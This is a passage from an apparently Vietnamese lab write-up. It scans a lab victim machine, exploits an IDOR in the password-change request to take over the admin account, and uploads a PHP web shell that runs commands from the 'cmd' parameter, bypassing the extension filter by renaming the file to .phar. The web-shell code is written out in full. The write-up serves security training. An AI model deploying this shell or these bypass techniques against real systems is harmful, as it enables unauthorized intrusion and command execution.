
# LAB 9
## Chuẩn bị
* Máy kali có ip `192.168.8.150` 
![image](https://user-images.githubusercontent.com/91528234/223001588-864ba829-debb-4e86-a0d2-c4fd373427b1.png)
* Máy nạn nhân chưa rõ ip
![image](https://user-images.githubusercontent.com/91528234/223001626-1b94b2e1-c247-41a5-89f4-0768eb8e157d.png)

## Quét mạng

* Mình dùng lệnh `netdiscorver` để quét ip máy nạn nhân
![image](https://user-images.githubusercontent.com/91528234/223001676-c3544566-6a0f-4c61-bf88-cfdd59e08571.png)

* Mình quét được thấy dải ip `192.168.8.152`
* Để tiếp tục quá trình này, chúng tôi sẽ khởi chạy Nmap.
```
nmap -sC -sV 192.168.8.152
```
Trong đó:

-sC: chạy các kịch bản script được tích hợp sẵn để quét port và thu thập thông tin hệ thống. Cờ này tương đương với việc sử dụng tất cả các kịch bản script có sẵn.

-sV: quét phiên bản dịch vụ của các port mở. Nó sẽ cố gắng xác định phiên bản của các dịch vụ được chạy trên các cổng mạng bằng cách truy vấn các cơ sở dữ liệu phiên bản dịch vụ được lưu trữ trong nmap.
![image](https://user-images.githubusercontent.com/91528234/223002728-964bc5f8-89f8-4383-918b-9b538919eb82.png)


* Chúng tôi có, theo đầu ra nmap:

  * trên cổng 22 có máy chủ SSH.

  * một dịch vụ HTTP (Apache Server) chạy trên cổng 80
* Sau đó check trên giao diện web

```
http://192.168.8.152/
```
  ![image](https://user-images.githubusercontent.com/91528234/223002935-ff4569ca-114d-4348-9144-056ae29166c5.png)
* Trong ảnh chụp màn hình ở trên, chúng ta có thể thấy ứng dụng đích. Có một chức năng đăng nhập, vì vậy hãy chuyển đến trang đăng nhập. Trang đăng nhập có thể được nhìn thấy dưới đây.
![image](https://user-images.githubusercontent.com/91528234/223003085-0fe4e76b-724c-4f8d-a9c0-df630872a33d.png)

* Ở đây, chúng tôi có chức năng đăng nhập cũng như đăng ký. Vì vậy, chúng tôi đã nhấp vào 'đăng ký' để đăng ký làm người dùng mới trên ứng dụng mục tiêu
![image](https://user-images.githubusercontent.com/91528234/223003460-4195bc78-ea6a-41a4-967d-02c12d02bc1e.png)
* Chúng tôi đã đăng ký với tư cách là người dùng mới trên máy mục tiêu và yêu cầu với các chi tiết được cung cấp có thể được nhìn thấy ở trên bị chặn trong cửa sổ burp. Hãy sử dụng những chi tiết này để đăng nhập vào ứng dụng mục tiêu.
![image](https://user-images.githubusercontent.com/91528234/223003721-fef80eca-2a37-42ec-bc89-d11f9be0f5a8.png)
* Chúng tôi đã đăng nhập vào ứng dụng mục tiêu bằng tên người dùng và mật khẩu là `321` Chúng tôi đã phân tích ứng dụng mục tiêu để tìm các lỗ hổng và tìm thấy một số lỗ hổng có thể được sử dụng để có lợi cho chúng tôi.

![image](https://user-images.githubusercontent.com/91528234/223003976-3048f1d6-cfc8-4cf2-ad6d-0669a12cae42.png)

* Có chức năng thay đổi mật khẩu cho người dùng hiện tại với lỗi quản lý phiên. Chúng tôi đã chặn yêu cầu thay đổi mật khẩu trong burp và thấy rằng thay đổi mật khẩu phụ thuộc vào tham số id.
![image](https://user-images.githubusercontent.com/91528234/223004177-ab6424d2-07f0-4ef3-90a9-097922cd909b.png)
* Chúng tôi đã thay đổi giá trị id người dùng hiện tại từ `2` thành id của người dùng quản trị viên, tức là `1`. Thông qua đó, chúng tôi có thể thay đổi mật khẩu cho quản trị viên người dùng. Sau đó, chúng tôi đã đăng nhập vào ứng dụng đích với tư cách là quản trị viên người dùng. Chúng tôi bắt đầu khám phá thêm chức năng thông qua người dùng quản trị.
![image](https://user-images.githubusercontent.com/91528234/223005967-d650f0d8-b9c3-4c7d-87de-c77d19eda614.png)
* Chuột phải ấn vào `send repeater` sau đó sáng trang repeater và ấn send
![image](https://user-images.githubusercontent.com/91528234/223006439-f7707c15-d630-4ec8-a0ba-686b3781d3a6.png)
* Vậy là chúng ta đổi thành công mật khẩu `admin` giờ thử đăng nhập vào user `admin` với mật khẩu là `abc` xem như thế nào
![image](https://user-images.githubusercontent.com/91528234/223006728-96b73290-90e5-4e87-a4bd-3109dab522c8.png)
* vậy là đã đăng nhập thành công trang chủ của admin
* Chúng tôi đã tìm thấy chức năng tải tệp lên trong ứng dụng mục tiêu. Nó dễ bị tải lên tệp độc hại. Chúng tôi có thể tải lên trình bao PHP thông qua điều này và có quyền truy cập vào máy mục tiêu.
# Tiêm mã độc
* Trên máy kẻ tấn công của chúng tôi, chúng tôi đã tạo một tải trọng ở dạng trình bao PHP để lấy trình bao đảo ngược từ máy mục tiêu.
```
<?php if(isset($_REQUEST[‘cmd’])){ echo “<pre>”; $cmd = ($_REQUEST[‘cmd’]); system($cmd); echo “</pre>”; die; }?>
```

![image](https://user-images.githubusercontent.com/91528234/223008508-178b0fd6-ef6c-46ab-89ca-65f765e46982.png)
* Trình bao PHP ở trên sẽ cho phép chúng tôi thực thi các lệnh trên máy mục tiêu thông qua trình duyệt. Chúng tôi đã lưu tệp dưới dạng 'shell.php. Hãy tải nó lên ứng dụng mục tiêu; điều này có thể được nhìn thấy bên dưới trong cửa sổ burp.

![image](https://user-images.githubusercontent.com/91528234/223007906-1a50752b-e2eb-43aa-a0bd-0d9df7651580.png)
* Như có thể thấy ở trên, quá trình tải lên không thành công vì ứng dụng đích không chấp nhận phần mở rộng tệp 'PHP. Vì vậy, trong phần yêu cầu, chúng tôi đã thay đổi phần mở rộng tệp thành 'phar'. Bạn có thể thấy điều này trong ảnh chụp màn hình sau.
![image](https://user-images.githubusercontent.com/91528234/223009033-31bd6014-e0e1-406f-85ff-c398db761ee1.png)

